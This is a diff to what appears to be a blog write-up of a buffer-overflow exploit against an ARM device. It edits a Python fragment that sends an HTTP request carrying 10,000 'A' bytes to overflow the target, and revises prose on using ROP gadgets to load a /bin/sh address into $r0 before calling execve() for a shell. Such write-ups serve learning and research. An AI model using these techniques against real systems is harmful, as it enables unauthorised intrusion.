@@ -145,10 +145,10 @@ head = ["GET . HTTP/1.1",
         "Host: rpi2-1",
         "Content-Length: 10000"]
 
-print("[+] sending header")
+log.info("sending header")
 r.send(crlf.join(head) + crlf*2)
 
-print("[+] sending body")
+log.info("sending body")
 r.send("A"*10000)
 {% endhighlight %}
 
@@ -307,8 +307,8 @@ restoring the context of the calling fubnction:
 {% endhighlight %}
 
 As we can see $pc is restored from the stack right after some registers. Since
-everything is in the stack on which we have total control over them, we are
-calling `execve()` the execution flow would expected that the pointer to our
+everything is in the stack on which we have total control over, when we
+call `execve()`, the execution flow would expected that the pointer to our
 string to execute be in $r0 as per ARM calling convention. So we need an extra
 gadgets to pop the `/bin/sh` address directly into $r0. `gef` module `ropgadget`
 will work perfectly for this. Finding suitable gadgets is a little harder on ARM
